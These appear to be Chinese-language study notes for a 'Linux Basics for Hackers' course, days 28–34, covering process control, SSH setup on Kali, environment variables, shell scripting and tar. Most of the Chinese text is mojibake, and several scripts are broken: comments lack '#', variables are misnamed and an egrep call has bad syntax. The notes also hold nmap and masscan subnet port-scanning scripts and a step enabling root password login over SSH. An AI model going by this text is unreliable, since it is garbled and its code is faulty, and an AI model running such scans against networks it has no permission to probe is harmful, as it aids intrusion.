3ï¼‰ ps -elf  //æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ˆä¼˜å…ˆçº§ï¼Œçˆ¶è¿›ç¨‹ç­‰ï¼‰

4ï¼‰æŸ¥çœ‹æŸä¸ªç”¨æˆ·è¿è¡Œçš„è¿›ç¨‹
ps -u ç”¨æˆ· 
ps -U ç”¨æˆ·

5ï¼‰æŸ¥çœ‹æŒ‡å®šçš„è¿›ç¨‹

 ps -p "1 2" -p 3,4
 
 ps -p "2 6" 
 ps -p 2,6
 1 â¨¯
    PID TTY          TIME CMD
      2 ?        00:00:00 kthreadd
      6 ?        00:00:00 kworker/0:0H-events_highpri
      9 ?        00:00:00 mm_percpu_wq
     10 ?        00:00:00 rcu_tasks_rude_



3ï¼‰pstree æŸ¥çœ‹è¿›ç¨‹æ ‘



### Day28**


28.1. Filtering by Process Name

æ ¹æ®è¿›ç¨‹çš„åå­—è¿›è¡Œè¿‡æ»¤
pid

Metasploitï¼ˆmsfï¼‰ exploitation framework
 æ¼æ´åˆ©ç”¨æ¡†æ¶
banner--æ——æ ‡
	msfconsole//å¯åŠ¨msfçš„æ§åˆ¶å°
	
ps aux | grep msfconsole
ps aux | egrep ("sshd"|"apache2") 
ps aux | grep -E ("sshd"|"apache2") 
	 
28.2. Finding the Greediest Processes with top
ä½¿ç”¨topæ‰¾åˆ°å ç”¨èµ„æºæ¯”è¾ƒå¤šçš„è¿›ç¨‹
åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹ï¼Œé»˜è®¤æ¯3ç§’é’Ÿåˆ·æ–°ä¸€æ¬¡
list dynamicallyâ€”by default, every 5 seconds

ï¼ˆ1ï¼‰äº¤äº’
 H or ? 

 d
 k  æ€æ­»ä¸€ä¸ªè¿›ç¨‹
 r  è°ƒæ•´è¿›ç¨‹çš„ä¼˜å…ˆçº§
 l  æŸ¥çœ‹ç³»ç»Ÿçš„å¹³å‡è´Ÿè½½
 t  æŒ‰ç…§cpuå ç”¨ï¼ˆæ—¶é—´ï¼‰æ’åº
 P  ä»¥cpuçš„ä½¿ç”¨èµ„æºæ’åº
 M  æŒ‰ç…§å†…å­˜å ç”¨æ’åº
 

ï¼ˆ2ï¼‰é€‰é¡¹

-d  è®¾å®šæ›´æ–°é—´éš”ï¼ˆç§’ï¼‰




ï¼ˆ3ï¼‰ç¨‹åºçš„ç®¡ç†

ç¨‹åºä¹‹é—´æ˜¯å¯ä»¥äº’ç›¸æ§åˆ¶çš„ï¼
é€šè¿‡ç»™äºˆè¯¥ç¨‹åºä¸€ä¸ªä¿¡å· ï¼ˆsignalï¼‰ å»å‘ŠçŸ¥è¯¥ç¨‹åºä½ æƒ³è¦è®©å¥¹ä½œä»€ä¹ˆ

æŸ¥çœ‹å¸¸ç”¨çš„ä¿¡å·å€¼
 kill -l ï¼ˆå°å†™çš„ L ï¼‰ æˆ–è€…æ˜¯ man 7 signal 
å¸¸ç”¨çš„ä¿¡å·å€¼ï¼š
15/sigterm  æ­£å¸¸ç»“æŸä¸€ä¸ªè¿›ç¨‹,é»˜è®¤
9/sigkill   å¼ºåˆ¶ç»“æŸä¸€ä¸ªè¿›ç¨‹ï¼Œå‰¯ä½œç”¨ä¼šæœ‰ä¸€äº›åŠæˆå“ï¼ˆå¦‚äº¤æ¢æ–‡ä»¶.swpäº§ç”Ÿï¼‰
1/sighup    å¸¸ç”¨äºé‡å¯ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ï¼Œé‡æ–°è¯»å–æœåŠ¡çš„é…ç½®æ–‡ä»¶
2/sigint    ç›¸å½“äºctrl-c ä¸­æ–­ä¸€ä¸ªç¨‹åºçš„è¿è¡Œ
19/sigstop  ç›¸å½“äºctrl-z ,æŠŠç¨‹åºæ”¾åœ¨åå°å¹¶åœæ­¢è¿è¡Œ


28.3.  ç»“æŸä¸€ä¸ªè¿›ç¨‹

kill [ä¿¡å·] è¿›ç¨‹idï¼ˆpidï¼‰


28.4 æ ¹æ®ç¨‹åºåæŸ¥çœ‹è¿›ç¨‹å·
pidof  ç¨‹åºå


28.5. æŸ¥çœ‹åå°ä»»åŠ¡
jobs 

28.6.  æŠŠåå°ä»»åŠ¡è°ƒå…¥å‰å°è¿è¡Œ
fg ä»»åŠ¡ç¼–å·

28.7. æŠŠåå°åœæ­¢ä»»åŠ¡å¯åŠ¨
bg  ä»»åŠ¡ç¼–å· 

 ping 192.168.195.15 &



### Day29**

29.1  Kaliä¸­é…ç½®å¯ç”¨sshæœåŠ¡ï¼Œå¹¶å…è®¸rootç”¨æˆ·å¯ä»¥ä½¿ç”¨å£ä»¤è®¤è¯è¿›è¡Œè¿œç¨‹ç™»å½• 


ï¼ˆ1ï¼‰sshæœåŠ¡
æ›´å®‰å…¨çš„è¿œç¨‹ç™»å½•æ–¹å¼
 22/tcp    // netstat -tnlp | grep ":22"
 è¿›ç¨‹å: sshd  //ps aux | grep sshd 
 
Step01: å¯åŠ¨sshæœåŠ¡
	systemctl start ssh
Step02: æŠŠsshæœåŠ¡è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨
	systemctl is-enabled ssh  //æŸ¥è¯¢sshæœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨   
	systemctl enable ssh
Step03: ä½¿ç”¨ç»ˆç«¯å·¥å…·è¿œç¨‹è¿æ¥Kali
		xshell
Step04 ç¼–è¾‘sshæœåŠ¡é…ç½®æ–‡ä»¶
     /etc/ssh/sshd_config
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%F)
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.src.$(date +%F)
æ·»åŠ è¿™ä¸€è¡Œ
PermitRootLogin yes

Step05 é‡å¯sshæœåŠ¡
	systemctl restart ssh 

kill -1 $(ps aux | grep 'sshd' | grep -v grep | awk '{print $2}')
kill -SIGHUP $(ps aux | grep 'sshd' | grep -v grep | awk '{print $2}')

ps aux | grep msfconsole
ps aux | egrep ("sshd"|"apache2") 
ps aux | grep -E ("sshd"|"apache2") 

kill -SIGHUP $ï¼ˆps aux | grep 'rsyslogd' | grep -v 'grep'| awk '{print $2}'ï¼‰

### Day30**
1. è¿›ç¨‹çš„å¸¸è§çŠ¶æ€

R ï¼ˆRunningï¼‰ï¼šè¯¥ç¨‹åºæ­£åœ¨è¿è¡Œä¸­ï¼›
S ï¼ˆSleepï¼‰ï¼šè¯¥ç¨‹åºç›®å‰æ­£åœ¨ç¡çœ çŠ¶æ€ï¼ˆidleï¼‰ï¼Œä½†å¯ä»¥è¢«å”¤é†’ï¼ˆsignalï¼‰ã€‚
D ï¼šä¸å¯è¢«å”¤é†’çš„ç¡çœ çŠ¶æ€ï¼Œé€šå¸¸è¿™ç§ç¨‹åºå¯èƒ½åœ¨ç­‰å¾… I/O çš„æƒ…å†µï¼ˆex>æ‰“å°ï¼‰
T ï¼šåœæ­¢çŠ¶æ€ï¼ˆstopï¼‰
Z ï¼ˆZombieï¼‰ï¼šåƒµå°¸çŠ¶æ€ï¼Œç¨‹åºå·²ç»ç»ˆæ­¢ä½†å´æ— æ³•ä»å†…å­˜è¢«ç§»é™¤

2. ç»“æŸè¿›ç¨‹
kill -ä¿¡å·  è¿›ç¨‹å·

killall -ä¿¡å· ç¨‹åºå 
15
9 
	ç»“æŸè¿›ç¨‹æ ‘
ã€æ¡ˆä¾‹ã€‘è¸¢æ‰ä¸€ä¸ªéæ³•ç”¨æˆ·	
pkill
	-u ç”¨æˆ·å  è¸¢æ‰ä¸€ä¸ªåœ¨çº¿ç”¨æˆ·


pgrep -u user2
	æ ¹æ®æŒ‡å®šç”¨æˆ·è¿‡æ»¤è¿›ç¨‹
	
PS: vi test.txt &

&  æŠŠç¨‹åºæ”¾åœ¨åå°è¿è¡Œ



30.2 è¿›ç¨‹ä¼˜å…ˆçº§è°ƒæ•´

ä¼˜å…ˆæ‰§è¡Œåº ï¼ˆpriority, PRIï¼‰ è¿™ä¸ª PRI å€¼è¶Šä½ä»£è¡¨è¶Šä¼˜å…ˆçš„æ„æ€

PRIï¼ˆnewï¼‰ = PRIï¼ˆoldï¼‰ + nice
nice å€¼å¯è°ƒæ•´çš„èŒƒå›´ä¸º -20 ~ 19 ï¼›
root å¯éšæ„è°ƒæ•´è‡ªå·±æˆ–ä»–äººç¨‹åºçš„ Nice å€¼ï¼Œä¸”èŒƒå›´ä¸º -20 ~ 19 ï¼›
ä¸€èˆ¬ä½¿ç”¨è€…ä»…å¯è°ƒæ•´è‡ªå·±ç¨‹åºçš„ Nice å€¼ï¼Œä¸”èŒƒå›´ä»…ä¸º 0 ~ 19 ï¼ˆé¿å…ä¸€èˆ¬ç”¨æˆ·æŠ¢å ç³»ç»Ÿèµ„æºï¼‰ï¼›
ä¸€èˆ¬ä½¿ç”¨è€…ä»…å¯å°† nice å€¼è¶Šè°ƒè¶Šé«˜ï¼Œä¾‹å¦‚æœ¬æ¥ nice ä¸º 5 ï¼Œåˆ™æœªæ¥ä»…èƒ½è°ƒæ•´åˆ°å¤§äº 5ï¼›

nice
	åœ¨è¿è¡Œè¿›ç¨‹æ—¶è®¾ç½®ä¼˜å…ˆçº§
	nice -n 10 ping 127.0.0.1
	ps -lef | grep ping

renice
	ä½¿ç”¨ renice å‘½ä»¤æ”¹å˜æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¼˜å…ˆçº§
    renice -5 2299 


top -u ç”¨æˆ·å
æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„åŠ¨æ€è¿›ç¨‹åˆ—è¡¨

30.3 æŠŠç¨‹åºæ”¾åœ¨åå°æ‰§è¡Œ

ç¨‹åº &
fg ç¨‹åºå è°ƒå…¥å‰å°
bg ç¨‹åºå æŠŠåå°çš„åœæ­¢çš„ä»»åŠ¡å¯åŠ¨

30.4. ä»»åŠ¡çš„è°ƒåº¦ï¼ˆå®‰æ’ä»»åŠ¡åœ¨ä»€ä¹ˆæ—¶é—´æ‰§è¡Œï¼‰

Scheduling Processes
ä¸€æ¬¡æ€§è°ƒåº¦  æœåŠ¡ atd
å‘¨æœŸæ€§è°ƒåº¦ æœåŠ¡ crond



apt install at

at now + 5 minutes  
at> /root/work/exam/day30/at_exam01.sh
at>ï¼ˆctrl+dï¼‰




atq  æŸ¥è¯¢ä»»åŠ¡è®¡åˆ’
atrm ä»»åŠ¡ç¼–å· åˆ é™¤ä»»åŠ¡



### Day31**Chapter 7 ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡
ç¯å¢ƒå˜é‡ï¼Œæ•ˆæœï¼ˆæ€§èƒ½ã€ä¾¿åˆ©ã€éšè”½ï¼‰

31.1 å˜é‡çš„æ¦‚å¿µ
å˜é‡å°±æ˜¯å‘½åçš„å†…å­˜åœ°å€ç©ºé—´ï¼ˆå‘½åçš„å®¹å™¨ï¼‰ï¼Œç”¨äºå­˜æ”¾å„ç§ç±»å‹çš„æ•°æ®
ï¼ˆ1ï¼‰å˜é‡èµ‹å€¼
å˜é‡åï¼å˜é‡å€¼
KEY=value
ï¼ˆ2ï¼‰æ˜¾ç¤ºå˜é‡
echoã€€ ${å˜é‡å}
31.2. ç¯å¢ƒå˜é‡
ç¯å¢ƒå˜é‡æ˜¯æ„å»ºåœ¨ç³»ç»Ÿå’Œæ¥å£ä¸­çš„ç³»ç»ŸèŒƒå›´çš„å˜é‡ï¼Œå®ƒä»¬
æ§åˆ¶ç”¨æˆ·å¯¹ç³»ç»Ÿçš„å¤–è§‚ã€è¡Œä¸ºå’Œâ€œæ„Ÿè§‰â€ï¼Œå¹¶ä¸”å®ƒä»¬ç”±ä»»ä½•å­ shell æˆ–è¿›ç¨‹ç»§æ‰¿ã€‚
ï¼ˆ3ï¼‰å–æ¶ˆä¸€ä¸ªå˜é‡

  unset å˜é‡å
PS: export å˜é‡

	æŠŠå˜é‡å¯¼å‡ºä¸ºå…¨å±€ï¼ˆç¯å¢ƒï¼‰å˜é‡

31.2. æŸ¥çœ‹æ‰€æœ‰é»˜è®¤çš„ç¯å¢ƒå˜é‡
env
31.3. æŸ¥çœ‹æ‰€æœ‰å˜é‡,åŒ…æ‹¬ shell å˜é‡ã€æœ¬åœ°å˜é‡å’Œ shell å‡½æ•°(å¦‚ä»»ä½•ç”¨æˆ·å®šä¹‰çš„å˜é‡å’Œå‘½ä»¤åˆ«å)
set 

31.4. ä¿®æ”¹ç¯å¢ƒå˜é‡

æ–¹æ³•1ï¼šç›´æ¥ä¿®æ”¹ï¼Œç”¨exportå¯¼å‡º
æ–¹æ³•2ï¼šä¿®æ”¹ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶

å»ºè®®åœ¨ä¿®æ”¹ç¯å¢ƒå˜é‡ä¹‹å‰ï¼Œå¯¹ç³»ç»Ÿå˜é‡è¿›è¡Œå¤‡ä»½
 set > ~/work/bak/sys_var.txt


HISTSIZE
	å®šä¹‰å†å²å‘½ä»¤çš„ä¸ªæ•°
	
set | grep HISTSIZE


history
æŸ¥çœ‹å†å²å‘½ä»¤


31.5 æœ‰å…³çš„ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶
å…¨å±€
	/etc/profile
    /etc/profile.d/*.sh
	/etc/bash.bashrcï¼ˆKaliï¼‰
	/etc/bashrc
ç”¨æˆ·
   ç”¨æˆ·å®¶ç›®å½•ä¸­
   .profile
   .bashrc 
   .zshrc*****ä»”ç»†ç ”è¯»
   .viminfo---viç¼–è¾‘å™¨å·¥ä½œç¯å¢ƒ

   
PS:  source .zshrc  
     é‡æ–°è¯»å–è„šæœ¬æ–‡ä»¶
	 
	 
31.6 æ›´æ”¹ SHELL æç¤ºç¬¦

HISTSIZE

é€šè¿‡è®¾ç½® PS1 å˜é‡çš„å€¼æ¥æ›´æ”¹é»˜è®¤ shell æç¤ºç¬¦ä¸­çš„åç§°ã€‚*****
PS2 ---äºŒçº§æç¤ºç¬¦

```
`â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# echo $PS1     
%F{%(#.blue.green)}â”Œâ”€â”€${debian_chroot:+($debian_chroot)â”€}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))â”€}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/â€¦/%4~.%5~)%b%F{%(#.blue.green)}]
â””â”€%B%(#.%F{red}#.%F{blue}$)%b%F{reset} 
```




PS1 å˜é‡æœ‰ä¸€ç»„å ä½ç¬¦ï¼Œç”¨äºæ˜¾ç¤ºå¸Œæœ›åœ¨æç¤ºç¬¦ä¸­æ˜¾ç¤ºçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å†…å®¹:
//bashæ”¯æŒä»¥ä¸‹å ä½ç¬¦
\u å½“å‰ç”¨æˆ·çš„åç§°
\h ä¸»æœºå
\W å½“å‰å·¥ä½œç›®å½•çš„åŸºæœ¬åç§°
\w  æ˜¾ç¤ºå®Œæ•´å·¥ä½œç›®å½•

zsh ç›®å‰çœ‹èµ·æ¥ä¸æ”¯æŒä»¥ä¸Šå ä½ç¬¦

ã€æ¡ˆä¾‹ã€‘
PS1="World's Best Hacker: #" ---Kali

export PS1='C:\w> '  -Centos



31.7 æ”¹å˜ä½ çš„ PATHå˜é‡

PATH å˜é‡ï¼Œå®ƒæ§åˆ¶æ‚¨çš„ shell å°†åœ¨ç³»ç»Ÿçš„å“ªä¸ªä½ç½®æŸ¥æ‰¾æ‚¨è¾“å…¥çš„å‘½ä»¤ï¼Œ


/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

å‘PATHå˜é‡æ·»åŠ ä¸€ä¸ªæ–°çš„è·¯å¾„ï¼Œé¿å…æŠŠä¸€ä¸ªç›®å½•ç›´æ¥èµ‹å€¼ç»™PATHå˜é‡
PATH=$PATH:æ–°çš„è·¯å¾„
`


### Day32**Chapter 8 shellè„šæœ¬

Any self-respecting hacker must be able to write scripts
ä½œä¸ºä¸€åé»‘å®¢å¿…é¡»å…·å¤‡è„šæœ¬ç¼–å†™çš„èƒ½åŠ›ï¼Œè‡³å°‘è¦æŒæ¡ï¼ˆç†Ÿæ‚‰ï¼‰ä¸€é—¨ç¼–ç¨‹è¯­è¨€

bash shell scriptsï¼ˆShellè„šæœ¬ç¼–å†™çš„èƒ½åŠ›ï¼‰

32.1 Your First Script: â€œHello, Hackers-Xiaofeixia!â€ 
å†™å‡ºç¬¬ä¸€ä¸ªè„šæœ¬

#!/bin/bash //è„šæœ¬çš„ç¬¬ä¸€è¡Œ
	è¦å‘Šè¯‰æ‚¨çš„æ“ä½œç³»ç»Ÿæ‚¨æƒ³ä¸ºè„šæœ¬ä½¿ç”¨å“ªä¸ªè§£é‡Šå™¨ã€‚
	#!/usr/bin/python3 
	æ·»åŠ æ³¨é‡Šçš„å¥½å¤„ï¼š
	 å¯¹è„šæœ¬è¯­å¥çš„è¯´æ˜ï¼ˆè„šæœ¬æ˜¯ä¸ºäº†åšä»€ä¹ˆä»¥åŠç¼–å†™çš„æ€è·¯ã€è¯´æ˜ç­‰ï¼‰
echo "Hello, Hackers-xiaofeixia!"

PS:shellè„šæœ¬çš„æ‰©å±•åé€šå¸¸ä»¥shç»“å°¾

ç¬¬ä¸€ä¸ªè„šæœ¬æ¡ˆä¾‹

first_script.sh 

#!/bin/bash
This is xiaofexia first script
echo "Hello, Hackers-xiaofeixia!"

ç»™è„šæœ¬æ·»åŠ å¯æ‰§è¡Œæƒé™

chmod +x first_script.sh 

è„šæœ¬çš„æ‰§è¡Œ
  ./first_script.sh
  PS1:æ–‡ä»¶åå‰çš„./å‘Šè¯‰ç³»ç»Ÿæˆ‘ä»¬å¸Œæœ›åœ¨first_script.shæ‰€åœ¨çš„å½“å‰ç›®å½•æ–‡ä»¶ä¸­æ‰§è¡Œæ­¤è„šæœ¬ã€‚
  
  PS2:å®ƒè¿˜å‘Šè¯‰ç³»ç»Ÿï¼Œå¦‚æœåœ¨å¦ä¸€ä¸ªåä¸º first_script.shçš„ç›®å½•ä¸­æœ‰å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯·å¿½ç•¥å®ƒï¼Œåªåœ¨å½“å‰ç›®å½•ä¸­è¿è¡Œfirst_script.shã€‚
  
  PS3:åœ¨æ‰§è¡Œè„šæœ¬æ—¶ä½¿ç”¨ ./è„šæœ¬åç§° æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å®è·µ
  

  sh first_script.sh ï¼ˆè·¯å¾„ï¼‰


32.2. è„šæœ¬è¿›é˜¶1

å†™ä¸€ä¸ªâ€œå¸¦æœ‰å˜é‡å’Œç”¨æˆ·è¾“å…¥çš„åŠŸèƒ½â€çš„è„šæœ¬

#!/bin/bash
readname
echo -n "First Name:"
read firstname
echo -n "Last Name:"
read lastname
echo
echo -e "Your First Name is: ${first}\n"
echo -e "Your Last Name is: ${lastname}\n"


è„šæœ¬ä¼˜åŒ–
#!/bin/bash
readname
read -p in zsh is not support
read -p "First Name: " firstname
read -p "Last Name: " lastname
echo 
echo -e "Your First Name is: ${firstname}\n"
echo -e "Your Last Name is: ${lastname}\n"



#!/bin/bash
This is my second bash script
echo  "What is your name:"
read name
echo  "What chapter are you on in Linux Basics for Hackers?"
read chapter
echo
echo -e "Welcome ${name} to Chapter ${chapter} of Linux Basics for Hackers!\n"

PS: è„šæœ¬çš„è°ƒè¯•å¼€å…³*****
    -x 
  bash -x è„šæœ¬çš„åå­—

32.3. è¡¥å…… Keyboard Shortcuts ï¼ˆBASHä¸­å¸¸ç”¨çš„å¿«æ·é”®ï¼‰

å‘ä¸Šå…‰æ ‡é”®  ---è°ƒç”¨æœ€åä¸€æ¬¡æ‰§è¡Œçš„å‘½ä»¤
ctrl+R   åœ¨å†å²å‘½ä»¤ä¸­æ ¹æ®å…³é”®å­—æŸ¥æ‰¾æŒ‡ä»¤è¿›è¡Œè°ƒç”¨*****
	æ‰¾åˆ°ä¹‹åå¯ä»¥å†æŒ‰ctrl+rç»§ç»­å¾€ä¸‹æŸ¥æ‰¾ 
Ctrl + Z  æŠŠç¨‹åºæ”¾åœ¨åå°å¹¶åœæ­¢è¿è¡Œ
Ctrl + C  ç»ˆæ­¢å½“å‰å‘½ä»¤çš„æ‰§è¡Œ 
Ctrl + L ==clear æ¸…å±
!! é‡å¤ä¸Šä¸€æ¡å‘½ä»¤
command | less å…è®¸ä½ ä½¿ç”¨ä¸Šä¸‹å…‰æ ‡é”®æ»šåŠ¨å±å¹•æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œç»“æœ
!$ï¼ˆESC+.ï¼‰ é‡å¤ä¸Šä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°
Ctrl + A ï¼ˆHomeï¼‰ å›åˆ°å‘½ä»¤è¡Œçš„è¡Œé¦–
Ctrl + Eï¼ˆENDï¼‰   å›åˆ°å‘½ä»¤è¡Œçš„è¡Œå°¾
Ctrl + U   åˆ é™¤å…‰æ ‡å‰çš„æ‰€æœ‰å†…å®¹ï¼Œå¹¶ä¸”æ”¾åˆ°å‰ªåˆ‡æ¿
Ctrl + K   åˆ é™¤å…‰æ ‡åçš„æ‰€æœ‰å†…å®¹ï¼Œå¹¶ä¸”æ”¾åˆ°å‰ªåˆ‡æ¿
Ctrl + Y   ç²˜è´´ ï¼Œé…åˆCtrl + K å’ŒCtrl + Uä½¿ç”¨
Ctrl + T   äº¤æ¢å…‰æ ‡å‰åçš„å­—ç¬¦
Ctrl + W   åˆ é™¤å…‰æ ‡å‰çš„ä¸€ä¸ªå•è¯æˆ–å‚æ•°
Ctrl + D  é€€å‡ºå½“å‰ç»ˆç«¯
Ctrl + <--  å‘å·¦ç§»åŠ¨ä¸€ä¸ªå•è¯
Ctrl + -->  å‘å³ç§»åŠ¨ä¸€ä¸ªå•è¯

### Day33**Chapter 8 shellè„šæœ¬è¿›é˜¶

33.1. ç¬¬ä¸€ä¸ªé»‘å®¢è„šæœ¬:æ‰«æå¼€æ”¾çš„ç«¯å£ï¼ˆä¸€ä¸ªç®€å•çš„æ‰«æå™¨ï¼‰

Gray hacker

nmap---ç½‘ç»œæ‰«æå·¥å…·
åŸºæœ¬è¯­æ³• 
 nmap [Scan Type(s)] [Options] {target specification}
 nmap [æ‰«æç±»å‹][æ‰«æé€‰é¡¹] {æ‰«æç›®æ ‡}
 
 -sT  å®Œå…¨è¿æ¥æ‰«æ ï¼ˆTCPçš„ä¸‰æ¬¡æ¡æ‰‹ï¼‰
 -p  æŒ‡å®šè¦æ‰«æçš„ç«¯å£
 -oG æŠŠæ‰«æç»“æœåˆ†ç±»ä¿å­˜
 
 nmap -sT  -p 21 192.168.4.238
 nmap -sT  -p 21 192.168.4.0/24
 
 MySQL ä½¿ç”¨ç«¯å£ 3306
 ftp   ä½¿ç”¨ç«¯å£ 21
 è¿œç¨‹æ¡Œé¢  ä½¿ç”¨ç«¯å£ 3389
 
 nmap -sT 192.168.181.0/24 -p 3306  >/dev/null  -oG MySQLscan
 

#!/bin/bash
This scripts is to scan LAN 21 port
nmap -sT 192.168.4.1-254 -p 21 >/dev/null -oG myscantmp.txt
cat myscantmp.txt | grep open | awk '{print $2}' >myscan.txt
cat myscan.txt

33.2. æ”¹è¿›æˆ‘ä»¬çš„æ‰«æå™¨

ä½¿å…¶ä¸ä»…é€‚ç”¨äºæ‚¨è‡ªå·±çš„æœ¬åœ°ç½‘ç»œã€‚å¦‚æœè¯¥è„šæœ¬èƒ½å¤Ÿæç¤ºç”¨æˆ·æƒ³è¦æ‰«æçš„ IP åœ°å€èŒƒå›´å’Œè¦æŸ¥æ‰¾çš„ç«¯å£ï¼Œ

#!/bin/bash
This scripts is to scan LAN 21 
echo -n "Please Input you scan network(eg:192.168.1.):"
read ipnet
echo -n "Please Input you scan start ip(eg:1):"
read firstip
echo -n "Please Input you scan end ip(eg:100):"
read lastip
echo -n "Please Input you scan port(eg:80)"
read port
nmap -sT ${ipnet}${firstip}-${lastip} -p $port >/dev/null -oG myscantmp.txt
cat myscantmp.txt | grep open | awk '{print $2}' >myscan.txt
cat myscan.txt

å­¦ç”Ÿçš„æ”¹è¿›1ï¼ˆæœ‰ä¸è¶³ï¼Œé€»è¾‘ï¼‰

 #!/bin/bash
read -p "Please enter the IP you are Scanning for: " IP
read -p "Please enter the port you want to scan: " port
masscan -p 1-65535 --rate 5000  ${IP} > scan_var.txt
cat scan_var.txt | cut -d" " -f4 | cut -d/ -f1 > port.txt
echo -n `cat port.txt` > port-a.txt
cat port-a.txt | sed s/" "/,/g > port-b.txt
echo `cat port-b.txt`
read -p "Which port do you want to view the details of? (eg:3389): " PORT
PORT=`cat port-b.txt`
nmap -sV -p ${PORT} -T4 -A ${IP} -oG scanvar.txt
	-sV    æŸ¥çœ‹æœåŠ¡çš„ç‰ˆæœ¬
	-T4    å¿«é€Ÿçš„æ‰«æ
	-A     ç»¼åˆæ‰«æ 
å±±ä¸œæ–°ååå¤§åŒ å¸ˆã€2020.7æœˆæ•™å¸ˆä¹‹æ˜Ÿã€æµå—å¹¿ç”µå¤§èµ›ä¼˜ç§€æŒ‡å¯¼æ•™å¸ˆã€2020å¹´ä¸­å›½è½¯ä»¶ä¸“ä¸šäººæ‰ä¼˜ç§€æ•™å¸ˆ
masscan+nmap ç»“åˆçš„è„šæœ¬

PS:masscan  å¿«é€Ÿçš„æ‰«æå·¥å…·
	-p
	--rate  æŒ‡å®šæ‰«æçš„é€Ÿç‡ï¼Œæ¯ç§’é’Ÿå‘å¤šå°‘ä¸ªåŒ…
	
å­¦ç”Ÿçš„æ”¹è¿›2

#!/bin/bash
echo 'masscan to load...........'
var=$(arp-scan -l | head -5 | tail -3 | awk '{print $1}')
for ip in $var
do
	masscan -p 0-65535 --rate 4000 $ip > masscan.txt
done
echo 'namp to load...........'
var2=$(cat masscan.txt | awk '{print $4}' | awk -F/ '{print $1}' )
var3=$(cat masscan.txt | head -1 | awk '{print $6}')
for port in $var2
do
		nmap -sV $var3 -p $port >> nmap.txt
done
cat nmap.txt	


### Day34**Chapter 9 å‹ç¼©å’Œå½’æ¡£ï¼ˆæ‰“åŒ…ï¼‰
34.1. å‹ç¼©æ˜¯ä»€ä¹ˆ?
å°†å‹ç¼©åˆ†ç±»ä¸ºæœ‰æŸæˆ–æ— æŸ
.mp3ã€ .mp4ã€ .png å’Œ.jpg éƒ½æ˜¯æœ‰æŸå‹ç¼©ç®—æ³•
æœ‰æŸå‹ç¼©çš„ä¼˜ç‚¹æ˜¯å®ƒçš„æ•ˆç‡å’Œæœ‰æ•ˆæ€§ã€‚å‹ç¼©æ¯”æ˜¯éå¸¸é«˜ï¼Œè¿™æ„å‘³ç€ç”Ÿæˆçš„æ–‡ä»¶æ¯”åŸå§‹æ–‡ä»¶å°å¾—å¤šã€‚

ä½†æ˜¯å¯¹äºé»‘å®¢æ¥è¯´ï¼Œå®Œæ•´æ€§é€šå¸¸æ¯”å‹ç¼©æ¯”é‡è¦å¾—å¤š

34.2. å°†æ–‡ä»¶å­˜æ¡£åœ¨ä¸€èµ·ï¼ˆæ‰“åŒ…ï¼‰
å·¥å…·:tar  *****
 tar å‘½ä»¤æŠŠè®¸å¤šæ–‡ä»¶å½’æ¡£åˆ›å»ºä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå°†å…¶ç§°ä¸ºå½’æ¡£æ–‡ä»¶ã€ tar æ–‡ä»¶æˆ– tar åŒ…ã€‚
GNU 'tar' saves many files together into a single tape or disk archive, and can
restore individual files from the archive.
å¸¸ç”¨çš„é€‰é¡¹
	-c, --create                åˆ›å»ºä¸€ä¸ªæ–°å½’æ¡£
    -f, --file=ARCHIVE          æŒ‡å®šå½’æ¡£æ–‡ä»¶
	-v  æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯
	-t, --list                 åˆ—å‡ºå½’æ¡£å†…å®¹
    -x, --extract, --get       ä»å½’æ¡£ä¸­è§£å‡ºæ–‡ä»¶
	-r, --append               è¿½åŠ æ–‡ä»¶è‡³å½’æ¡£ç»“å°¾
å‹ç¼©é€‰é¡¹:

  -a, --auto-compress        ä½¿ç”¨å½’æ¡£åç¼€åæ¥å†³å®šå‹ç¼©ç¨‹åº
  -I, --use-compress-program=PROG
                             é€šè¿‡ PROG è¿‡æ»¤(å¿…é¡»æ˜¯èƒ½æ¥å— -d
                             é€‰é¡¹çš„ç¨‹åº)
-j, --bzip2                é€šè¿‡ bzip2 å¤„ç†å½’æ¡£
-J, --xz                   é€šè¿‡ xz å¤„ç†å½’æ¡£
      --lzip                 é€šè¿‡ lzip è¿‡æ»¤å½’æ¡£
      --lzma                 é€šè¿‡ xz è¿‡æ»¤å½’æ¡£
      --lzop                 é€šè¿‡ lzop è¿‡æ»¤å½’æ¡£
      --no-auto-compress     ä¸ä½¿ç”¨å½’æ¡£åç¼€åæ¥å†³å®šå‹ç¼©ç¨‹åº
      --zstd                 é€šè¿‡ zstd è¿‡æ»¤å½’æ¡£
-z, --gzip, --gunzip, --ungzip   é€šè¿‡ gzip å¤„ç†å½’æ¡£
-Z, --compress, --uncompress   é€šè¿‡ compress å¤„ç†å½’æ¡£


-C, --directory=DIR        æ”¹å˜è§£å‹ç›®æ ‡ä½ç½®


  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.
  tar -tvf archive.tar         # List all files in archive.tar verbosely.
  tar -xf archive.tar          # Extract all files from archive.tar.


ç»ƒä¹ 
mkdir day34;cd day34
cp /etc/hosts .  
cp /etc/resolv.conf . 
cp /etc/network/interfaces .

tar -cf  net_config.tar hosts resolv.conf interfaces
